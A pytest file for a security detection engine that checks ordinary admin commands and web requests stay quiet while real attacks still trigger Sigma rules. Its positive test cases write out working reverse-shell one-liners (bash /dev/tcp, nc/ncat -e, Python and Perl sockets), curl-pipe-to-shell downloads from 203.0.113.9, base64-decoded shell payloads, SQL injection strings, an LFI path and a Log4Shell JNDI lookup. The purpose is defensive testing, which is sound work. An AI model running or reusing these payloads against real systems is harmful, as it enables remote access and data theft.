# tests/worker/test_rule_false_positives.py
"""Ordinary admin, developer and visitor activity must not raise the shipped
high/critical rules, and the attacks those rules exist for must still fire.

Each benign case used to match: "rsync -e ssh" read as "nc -e", "| sha256sum"
as "| sh", a socket health check as a Python reverse shell, "select ... from"
in a search box as SQL injection, a Jenkins build step as a webshell, a Go test
binary as a dropper."""
import asyncio
import glob
import itertools
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../worker"))

import pytest  # noqa: E402
import yaml  # noqa: E402

from worker.decoder_engine import DecoderEngine  # noqa: E402
from worker.sigma_engine import SigmaEngine  # noqa: E402

ROOT = os.path.join(os.path.dirname(__file__), "../..")

REVERSE = "Reverse Shell Or Bind Shell In A Command Line"
DOWNLOAD = "Download Piped Into A Shell Or Interpreter"
PYSHELL = "Python Or Perl Reverse Shell"
B64 = "Base64 Payload Decoded Into A Shell"
SQLI = "SQL Injection In A Web Request"
WEB_SHELL = "Web Server Started A Shell"
APP_SHELL = "Java Or Node App Started A Shell"
TEMP_EXEC = "Program Made Executable Or Run From A Temp Folder On Linux"


@pytest.fixture(scope="module")
def engines():
    load = lambda p: [open(f).read() for f in sorted(glob.glob(os.path.join(ROOT, p)))]  # noqa: E731
    dec = DecoderEngine()
    dec.load_from_yaml_list(sorted(load("decoders/*.yaml"), key=lambda c: yaml.safe_load(c).get("priority", 100)))
    sig = SigmaEngine()
    sig.load_from_yaml_list(load("rules/*.yaml"))
    assert not sig.load_errors, sig.load_errors
    return dec, sig


def _eval(sig, event):
    return {m["title"]: m["level"] for m in asyncio.run(sig.evaluate(event))}


def cmdline_alerts(engines, cmd):
    """A command line as sudo/cron/Sysmon-sourced decoders hand it on (process.command_line)."""
    _, sig = engines
    return _eval(sig, {"process.command_line": cmd, "log_type": "linux_sudo",
                       "raw_message": f"sudo: admin : COMMAND={cmd}", "hostname": "web-1"})


def exec_alerts(engines, image, cmd, parent="", comm=""):
    """An agent eBPF process-exec line, through the shipped decoder."""
    dec, sig = engines
    line = f'Image="{image}" CommandLine="{cmd}" PID=20 PPID=10 User=1000'
    if parent:
        line += f' ParentImage="{parent}"'
    if comm:
        line += f' Comm="{comm}"'
    event, _ = dec.decode_named("linux_process_exec", line)
    return _eval(sig, dict(event, raw_message=line, log_type="linux_process_exec", hostname="web-1"))


_REQUEST = itertools.count(1)


def web_matches(engines, path, referrer="-", status=200, ip=None):
    dec, sig = engines
    n = next(_REQUEST)
    ip = ip or f"45.9.{n // 250}.{n % 250 + 1}"  # one IP per request: rule suppression would hide repeats
    line = (f'{ip} - - [20/Oct/2026:09:00:00 +0700] "GET {path} HTTP/1.1" {status} 150 "{referrer}" '
            '"Mozilla/5.0 (X11; Linux x86_64)"')
    event = dec.decode("nginx_access_combined", line)
    return {m["title"]: m for m in asyncio.run(sig.evaluate(dict(event, raw_message=line,
                                                                   log_type="nginx_access_combined")))}


def web_alerts(engines, path, referrer="-", status=200):
    return {t: m["level"] for t, m in web_matches(engines, path, referrer, status).items()}


@pytest.mark.parametrize("cmd,title", [
    ("rsync -avz -e ssh /srv/www backup@10.0.0.5:/backup", REVERSE),
    ("/usr/bin/sync && func --list", REVERSE),
    ("curl -sL https://example.com/app.tar.gz | sha256sum", DOWNLOAD),
    ("curl -s https://api.example.com/x | jq . | shuf", DOWNLOAD),
    ("wget -qO- https://example.com/sums.txt | shasum -c", DOWNLOAD),
    ("python3 -c 'import socket; print(socket.gethostname())'", PYSHELL),
    ("/usr/bin/perl /usr/share/foo/check-system-health.pl", PYSHELL),
    ("perl -MFile::Copy -e 'copy(\"a\",\"b\")' /etc/Filesystem.conf", PYSHELL),
    ("echo dXNlcm5hbWVwYXNzd29yZDEyMzQ1 | base64", B64),
    ("echo YWRtaW46c3VwZXJzZWNyZXRwYXNz | base64 -d", B64),
    ("base64 -d backup.b64 | sha256sum", B64),
    ("nc -zv db.internal 5432", REVERSE),                        # a port check
    ("nc -w 3 mail.example.com 25", REVERSE),
    ("curl -s https://example.com/install.sh -o install.sh && sha256sum install.sh", DOWNLOAD),
])
def test_ordinary_command_lines_stay_quiet(engines, cmd, title):
    assert title not in cmdline_alerts(engines, cmd)


@pytest.mark.parametrize("cmd,title", [
    ("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", REVERSE),
    ("nc -e /bin/sh 203.0.113.9 4444", REVERSE),
    ("/usr/bin/ncat 203.0.113.9 4444 -e /bin/bash", REVERSE),
    ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 4444 >/tmp/f", REVERSE),
    ("curl -fsSL http://203.0.113.9/x.sh | bash", DOWNLOAD),
    ("curl -s http://203.0.113.9/x | sudo sh", DOWNLOAD),
    ("curl http://203.0.113.9/p.py | python3 -", DOWNLOAD),
    ("wget -qO- http://203.0.113.9/x.sh | sh", DOWNLOAD),
    ("wget http://203.0.113.9/x.sh -O - | /bin/bash", DOWNLOAD),
    ("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
     "s.connect((\"203.0.113.9\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'", PYSHELL),
    ("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", PYSHELL),
    ("perl -e 'use Socket;$i=\"203.0.113.9\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
     "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");exec(\"/bin/sh -i\");};'", PYSHELL),
    ("echo Y3VybCBodHRwOi8vMjAzLjAuMTEzLjkveCB8IHNo | base64 -d | bash", B64),
    ("base64 --decode /tmp/p.b64 | sh", B64),
    ("bash -c \"$(echo aWQ7dW5hbWUgLWE= | base64 -d)\"", B64),
    ("eval $(echo aWQ= | base64 -d)", B64),
    # each of these slipped past an earlier draft of the tightened rules
    ("sh -c 'nc 203.0.113.9 4444 -e sh'", REVERSE),
    ("curl http://203.0.113.9/x|bash>/dev/null", DOWNLOAD),
    ("perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"203.0.113.9:4444\");"
     "STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'", PYSHELL),
    # and these the original rules missed
    ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 203.0.113.9 4444 >/tmp/f", REVERSE),
    ("nc.traditional -e /bin/sh 203.0.113.9 4444", REVERSE),
    ("ncat --exec /bin/sh 203.0.113.9 4444", REVERSE),
    ("ncat -c bash 203.0.113.9 4444", REVERSE),
])
def test_attacks_still_fire(engines, cmd, title):
    assert title in cmdline_alerts(engines, cmd)


@pytest.mark.parametrize("path,referrer", [
    ("/search?q=select+a+plan+from+our+catalog", "-"),
    ("/blog/how-to-select-data-from-postgres", "-"),
    ("/", "https://www.google.com/search?q=select+best+laptop+from+list"),
    ("/products?sort=price&select=all+from+2024", "-"),
])
def test_plain_english_select_from_is_not_sql_injection(engines, path, referrer):
    assert SQLI not in web_alerts(engines, path, referrer)


@pytest.mark.parametrize("path", [
    "/item?id=1+AND+(SELECT+1+FROM+users)",
    "/item?id=1'+AND+(SELECT+COUNT(*)+FROM+users)>0--",
    "/item?id=1'+OR+SELECT+password+FROM+users",
    "/item?id=1;SELECT+pg_sleep(5)+FROM+x",
    "/item?id=-1+select+table_name+from+information_schema.tables",
    "/login?u=admin'--&q=select+password+from+users--",
    "/search?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--",
    "/p?id=1+select+password+from+users",
    "/p?id=-1+OR+1=1",
    "/p?id=1'+OR+'1'='1",
    "/p?id=1';WAITFOR+DELAY+'0:0:5'--",
    "/p?id=1'+AND+1=CONVERT(int,(SELECT+@@version))--",
    "/p?id=(SELECT+CASE+WHEN+(1=1)+THEN+1+ELSE+0+END)",
])
def test_sql_injection_still_fires(engines, path):
    assert SQLI in web_alerts(engines, path)


def test_web_servers_starting_a_shell_stay_critical(engines):
    got = exec_alerts(engines, "/bin/sh", "sh -c id", parent="/usr/sbin/apache2", comm="apache2")
    assert got.get(WEB_SHELL) == "critical" and APP_SHELL not in got


@pytest.mark.parametrize("cmd", ["sh -c id", "/bin/sh -c curl http://203.0.113.9/x|sh"])
def test_java_or_node_starting_a_shell_goes_to_triage_not_paging(engines, cmd):
    # high: the AI analyst triages it at the default ai_min_severity (a JSP webshell
    # or Confluence RCE looks like this); critical stays for real web servers
    for runtime in ("/usr/bin/java", "/usr/bin/node"):
        got = exec_alerts(engines, "/bin/sh", cmd, parent=runtime)
        assert got.get(APP_SHELL) == "high" and WEB_SHELL not in got, (runtime, got)


JENKINS_PIPELINE = ("sh -c ({ while [ -d '/var/lib/jenkins/workspace/app@tmp/durable-5f2c9a1b' -a \\! -f "
                    "'/var/lib/jenkins/workspace/app@tmp/durable-5f2c9a1b/jenkins-result.txt' ]; do touch "
                    "'/var/lib/jenkins/workspace/app@tmp/durable-5f2c9a1b/jenkins-log.txt'; sleep 3; done } & "
                    "jsc=durable-0a1b; JENKINS_SERVER_COOKIE=$jsc 'sh' -xe "
                    "'/var/lib/jenkins/workspace/app@tmp/durable-5f2c9a1b/script.sh' > "
                    "'/var/lib/jenkins/workspace/app@tmp/durable-5f2c9a1b/jenkins-log.txt' 2>&1; wait) >&- 2>&- &")


@pytest.mark.parametrize("cmd", ["/bin/sh -xe /tmp/jenkins4512.sh", JENKINS_PIPELINE])
def test_jenkins_build_steps_stay_quiet(engines, cmd):
    got = exec_alerts(engines, "/bin/sh", cmd.replace('"', "'"), parent="/usr/bin/java")
    assert APP_SHELL not in got and WEB_SHELL not in got, got


@pytest.mark.parametrize("cmd", [
    "sh -c curl http://203.0.113.9/x|sh; /tmp/jenkins1.sh",      # naming a jenkins file is not enough
    "sh -xe /tmp/jenkins1.sh; id",
    "sh -c id #@tmp/durable-5f2c9a1b",
])
def test_payloads_mentioning_jenkins_still_alert(engines, cmd):
    assert exec_alerts(engines, "/bin/sh", cmd, parent="/usr/bin/java").get(APP_SHELL) == "high"


@pytest.mark.parametrize("image", ["/tmp/go-build123/b001/exe/main", "/tmp/go-build998/b042/pkg.test"])
def test_go_toolchain_binaries_are_not_temp_droppers(engines, image):
    assert TEMP_EXEC not in exec_alerts(engines, image, image)


@pytest.mark.parametrize("image", ["/tmp/k", "/dev/shm/x", "/tmp/go-build1/evil", "/tmp/go-build1/b1/exe/sub/x"])
def test_programs_run_from_temp_still_fire(engines, image):
    assert TEMP_EXEC in exec_alerts(engines, image, image)


LFI = "Access to /etc/passwd"
LOG4SHELL = "Log4Shell JNDI Lookup In A Web Request (CVE-2021-44228)"
SQLI_PATH = "/item?id=1'+AND+(SELECT+COUNT(*)+FROM+users)>0--"
LFI_PATH = "/index.php?page=../../../../etc/passwd"
JNDI_PATH = "/x?u=%24%7Bjndi%3Aldap%3A%2F%2F45.9.20.1%2Fa%7D"


@pytest.mark.parametrize("path,title,level", [(SQLI_PATH, SQLI, "high"), (LFI_PATH, LFI, "high")])
def test_a_payload_the_server_turned_away_is_one_level_lower(engines, path, title, level):
    lower = {"critical": "high", "high": "medium"}[level]
    for status in (200, 500, 302):
        assert web_alerts(engines, path, status=status)[title] == level, status
    for status in (404, 403, 400, 405, 429):
        m = web_matches(engines, path, status=status)[title]
        assert (m["level"], m["http_outcome"], m["http_status"]) == (lower, "rejected", status)


def test_a_rejected_probe_does_not_mute_the_hit_that_follows(engines):
    # a scanner's 404s, then the endpoint that answers 200, from one address within the
    # rule's suppression window: the 200 must still alert at full level
    ip = "45.10.0.7"
    assert web_matches(engines, SQLI_PATH, status=404, ip=ip)[SQLI]["level"] == "medium"
    assert SQLI not in web_matches(engines, SQLI_PATH, status=404, ip=ip)      # repeats stay suppressed
    hit = web_matches(engines, SQLI_PATH, status=200, ip=ip)[SQLI]
    assert hit["level"] == "high" and "http_outcome" not in hit
    assert SQLI not in web_matches(engines, SQLI_PATH, status=200, ip=ip)


def test_log4shell_keeps_its_level_on_a_404(engines):
    assert web_alerts(engines, JNDI_PATH, status=404)[LOG4SHELL] == "critical"


def test_only_single_request_payload_web_rules_follow_the_status():
    from worker.sigma_engine import _http_outcome_adjusts
    docs = {d["title"]: d for f in glob.glob(os.path.join(ROOT, "rules/*.yaml"))
            for d in yaml.safe_load_all(open(f)) if isinstance(d, dict) and "detection" in d}
    adjusts = lambda t: _http_outcome_adjusts(docs[t], docs[t].get("logsource") or {})  # noqa: E731
    assert adjusts(SQLI) and adjusts(LFI)
    for title in (LOG4SHELL,                                                   # opted out
                  "Repeated HTTP 401 Unauthorized (Web Auth Brute Force)",     # about the status
                  "WAF Blocking Repeated Attacks From One Source",             # about volume
                  WEB_SHELL):                                                  # not a web log rule
        assert not adjusts(title), title


# ─── network rules that never ran (logsource "product: linux_network") ───────

HIGH_PORT = "Outbound Connection To A Metasploit-Style Port (4444-4450)"
SHELL_NET = "Shell Opened A Network Connection To A Public Address"
TLD = "DNS Query For A Suspicious TLD"


def agent_alerts(engines, log_type, line, host="web-1"):
    """A Linux agent netwatch line (or a Windows ETW one), through the shipped decoder."""
    dec, sig = engines
    event, name = dec.decode_named(log_type, line)
    assert name, line
    return _eval(sig, dict(event, raw_message=line, log_type=log_type, hostname=host))


def connect_line(comm, dst, dport, private="false"):
    return (f"ts=2026-11-23T10:00:00Z pid=10 tgid=10 uid=33 gid=33 comm={comm} action=network_connect proto=tcp "
            f"direction=outbound src=10.0.0.5 dport={dport} dst={dst} lport=50000 host= private_dst={private}")


def dns_line(name):
    return (f"ts=2026-11-23T10:00:00Z pid=11 tgid=11 uid=1000 gid=1000 comm=firefox action=dns_query proto=udp "
            f"direction=outbound src=10.0.0.5 dport=53 dst=1.1.1.1 lport=0 host={name} private_dst=false")


def test_outbound_metasploit_port(engines):
    assert agent_alerts(engines, "linux_network_connect", connect_line("x", "45.33.32.10", 4444)).get(HIGH_PORT) == "high"
    # the same host, address and port again today: one alert
    assert HIGH_PORT not in agent_alerts(engines, "linux_network_connect", connect_line("x", "45.33.32.10", 4444))
    assert HIGH_PORT not in agent_alerts(engines, "linux_network_connect", connect_line("x", "45.33.32.11", 443))
    assert HIGH_PORT not in agent_alerts(engines, "linux_network_connect",
                                         connect_line("x", "10.0.0.9", 4444, private="true"))


def test_a_shell_connecting_out_itself(engines):
    assert agent_alerts(engines, "linux_network_connect", connect_line("bash", "45.33.32.20", 4444)).get(SHELL_NET) == "high"
    for comm in ("curl", "python3", "perl", "apt"):  # programs connect under their own name
        assert SHELL_NET not in agent_alerts(engines, "linux_network_connect", connect_line(comm, "45.33.32.21", 443))
    assert SHELL_NET not in agent_alerts(engines, "linux_network_connect",
                                         connect_line("bash", "10.0.0.9", 22, private="true"))


def test_suspicious_tld_linux_and_windows_low_once_a_day(engines):
    assert agent_alerts(engines, "linux_dns_query", dns_line("abc.xyz"), host="ws-1").get(TLD) == "low"
    assert TLD not in agent_alerts(engines, "linux_dns_query", dns_line("abc.xyz"), host="ws-1")
    assert agent_alerts(engines, "linux_dns_query", dns_line("cdn.shop.top"), host="ws-1").get(TLD) == "low"
    assert agent_alerts(engines, "linux_dns_query", dns_line("abc.xyz"), host="ws-2").get(TLD) == "low"
    assert TLD not in agent_alerts(engines, "linux_dns_query", dns_line("www.example.com"), host="ws-1")
    win = ('EventID=22 Channel="ETW" Provider="Microsoft-Windows-DNS-Client" ProcessId="1200" '
           'Image="C:\\Windows\\System32\\svchost.exe" User="WIN01\\alice" '
           'QueryName="update.badcdn.top" QueryType="1" QueryStatus="0" QueryResults="203.0.113.9;"')
    assert agent_alerts(engines, "windows_etw_dns", win, host="pc-1").get(TLD) == "low"
